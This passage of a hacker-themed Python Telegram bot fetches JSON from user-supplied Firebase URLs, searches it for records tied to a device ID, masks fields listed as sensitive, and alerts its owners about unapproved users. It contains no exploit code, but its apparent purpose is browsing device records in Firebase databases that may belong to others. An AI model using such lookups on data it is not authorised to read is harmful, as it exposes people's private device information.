        "╚═══════════════════════════════╝\n",
        f"🆔 Your ID: <code>{chat_id}</code>",
    ]
    if username:
        user_info_lines.append(f"👤 Username: @{html.escape(username)}")
    send_msg(chat_id, "\n".join(user_info_lines), reply_markup=reply_markup)
    owner_text = [
        "⚠️ [INTRUDER ALERT]",
        "════════════════════════════",
        f"ID: <code>{chat_id}</code>",
        f"Name: {html.escape(first_name)}",
    ]
    if username:
        owner_text.append(f"Username: @{html.escape(username)}")
    owner_text.append("")
    owner_text.append(f"Approve: <code>/approve {chat_id}</code>")
    send_msg(OWNER_IDS, "\n".join(owner_text))

def format_uptime(seconds: int) -> str:
    days = seconds // 86400
    seconds %= 86400
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours:
        parts.append(f"{hours}h")
    if minutes:
        parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)

def mask_number(value: str, keep_last: int = 2) -> str:
    if not value:
        return ""
    s = "".join(ch for ch in str(value) if ch.isdigit())
    if len(s) <= keep_last:
        return "*" * len(s)
    return "*" * (len(s) - keep_last) + s[-keep_last:]

def search_records_by_device(snapshot, device_id, path=""):
    matches = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if str(k) == str(device_id) and isinstance(v, dict):
                matches.append(v)
            if isinstance(v, dict):
                did = (
                    v.get("DeviceId")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("DeviceID")
                )
                if did and str(did) == str(device_id):
                    matches.append(v)
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if isinstance(v, dict):
                did = (
                    v.get("DeviceId")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("DeviceID")
                )
                if did and str(did) == str(device_id):
                    matches.append(v)
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)
    return matches

def safe_format_device_record(rec: dict) -> str:
    lines = [
        "╔═══════════════════════════════╗",
        "║     DEVICE RECORD FOUND       ║",
        "╠═══════════════════════════════╣",
        ""
    ]
    for k, v in rec.items():
        key_lower = str(k).lower()
        if key_lower in SENSITIVE_KEYS:
            masked = mask_number(v, keep_last=2)
            show_val = f"{masked} (🔒 HIDDEN)"
        else:
            show_val = str(v)
        lines.append(
            f"<b>{html.escape(str(k))}</b>: <code>{html.escape(show_val)}</code>"
        )
    lines.append("")
    lines.append("⚠️ Sensitive data encrypted for security")
    lines.append("╚═══════════════════════════════╝")
    return "\n".join(lines)

def refresh_firebase_cache(chat_id):
    base_url = firebase_urls.get(chat_id)
    if not base_url:
        return
    snap = http_get_json(normalize_json_url(base_url))
    if snap is None:
        return
    firebase_cache[chat_id] = snap
    cache_time[chat_id] = time.time()
    try:
        hacking_print("Cache refreshed", "💾 [CACHE]", sound_emoji=True)
        send_msg(chat_id, "♻️ [CACHE] Firebase cache refreshed.")
        send_msg(OWNER_IDS, f"♻️ [CACHE] Refreshed for user <code>{chat_id}</code>")
    except Exception:
        pass

def cache_refresher_loop():
    while True:
        now = time.time()
        for cid in list(firebase_urls.keys()):
            if now - cache_time.get(cid, 0) >= CACHE_REFRESH_SECONDS:
                refresh_firebase_cache(cid)
        time.sleep(60)

if __name__ == "__main__":
    try:
        # Install required packages if not present
        try:
            import speedtest
            import psutil
        except ImportError:
            hacking_print("Installing required packages...", "📦 [INSTALLING]")
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "speedtest-cli", "psutil"])
            import speedtest
            import psutil
        
        # Start cache refresher thread
        threading.Thread(target=cache_refresher_loop, daemon=True).start()
        
        # Start main loop
        main_loop()
    except KeyboardInterrupt:
        running = False
        hacking_print("Shutting down cyber systems...", "🛑 [SHUTDOWN]")
        for i in range(100, -1, -10):
            hacking_print(show_progress_bar(i, "System shutdown"))
            time.sleep(0.2)
        print("\n" + random.choice(ASCII_HACKING))
        hacking_print("All systems terminated.", "🔒 [OFFLINE]")
